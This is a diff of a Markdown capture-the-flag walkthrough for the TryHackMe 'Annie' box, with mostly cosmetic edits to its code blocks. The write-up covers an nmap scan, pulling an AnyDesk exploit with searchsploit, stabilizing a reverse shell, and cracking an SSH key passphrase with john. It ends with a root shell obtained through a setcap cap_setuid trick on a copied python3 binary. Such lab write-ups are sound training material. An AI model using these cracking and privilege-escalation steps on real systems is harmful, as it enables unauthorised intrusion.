@@ -9,20 +9,21 @@ tags:
 image: /images/tryhackme_annie/annie.png
 ---
 # Summary
+
 Annie is a **medium** difficulty Linux box on [TryHackMe](https://tryhackme.com/room/annie). This machine involved compromising a vulnerable AnyDesk installation and then abusing an uncommon SetUID binary to elevate privileges to root. 
-<!--more-->
+
 # Walkthrough
 ## Enumeration
 ### Nmap
 After exporting the hostname and IP to environment variables, I ran a basic nmap scan with default scripts and version detection against all ports. 
 
-```bash
-sudo nmap -sC -sV -vv -p- -oA nmap/$name $ip
+```console
+$ sudo nmap -sC -sV -vv -p- -oA nmap/$name $ip
 ```
 
 We can see that TCP ports 22 and 7070 are open. The higher numbered ports didn't turn out to be anything. 
 
-```bash
+```console
 Nmap scan report for 10.10.58.196
 Host is up, received reset ttl 61 (0.22s latency).
 Scanned at 2022-07-04 12:52:53 CDT for 1456s
@@ -49,8 +50,8 @@ After some research, I found that TCP port 7070 is commonly used with AnyDesk so
 
 I grabbed that exploit using `searchsploit`.
 
-```bash
-searchsploit -m 49613
+```console
+$ searchsploit -m 49613
 ```
 
 ## Exploit
@@ -122,7 +123,7 @@ After updating those values and running the exploit with `python2 49613.py` we g
 
 ### Stabilize the shell
 Stablize the reverse shell with the following commands
-```bash
+```console
 # Spawn a bash shell with Python
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 
@@ -143,8 +144,8 @@ Go ahead and grab the user flag.
 ## SSH
 Checking around annie's home directory, we find an SSH key that will let us get a more stable shell. Copy that key onto your attacking machine and change permissions using 
 
-```bash
-chmod 600 annie.key
+```console
+$ chmod 600 annie.key
 ```
 
 As soon as we try to SSH into the machine as the `annie` user, we find that the key has a passphrase. 
@@ -157,14 +158,14 @@ To crack the passphrase for Annie's key, we need to use `ssh2john`. Depending on
 ### Get a John-compatible hash
 In order to use `john` to get the passphrase, we need to get it into a compatible hash format. We can do that with `ssh2john`. 
 
-```bash
-ssh2john.py annie.key > annie.hash
+```console
+$ ssh2john.py annie.key > annie.hash
 ```
 
 Once we have a compatible hash, we can use `john` to crack the passphrase. 
 
-```bash
-john --wordlist=/opt/wordlists/rockyou.txt annie.hash
+```console
+$ john --wordlist=/opt/wordlists/rockyou.txt annie.hash
 ```
 
 After a few minutes, the hash will crack and you'll have the passphrase. 
@@ -186,22 +187,22 @@ The `setcap` binary allows the user to set file capabilities. To exploit this, w
 ### Copy the Python binary
 First, make a copy of the `python3` binary in the annie home directory. 
 
-```bash
-cp /usr/bin/python3 /home/annie/python3
+```console
+$ cp /usr/bin/python3 /home/annie/python3
 ```
 
 ### Set the `cap_setuid+ep` capability
 To escalate privileges, we're going to add the `cap_setuid+ep` capability to the local copy of the `python3` binary. This will allow us to set the effective user id of the created process (i.e., 0 for root). 
 
-```bash
-setcap cap_setuid+ep /home/annie/python3
+```console
+$ setcap cap_setuid+ep /home/annie/python3
 ```
 
 ### Spawn a new process as root
 Now that we've set the capability on the local python binary, we can run the following command to escalate to root.
 
-```bash
-./python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
+```console
+$ ./python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
 ```
 
 ![](images/tryhackme_annie/Pasted%20image%2020220704142433.png)
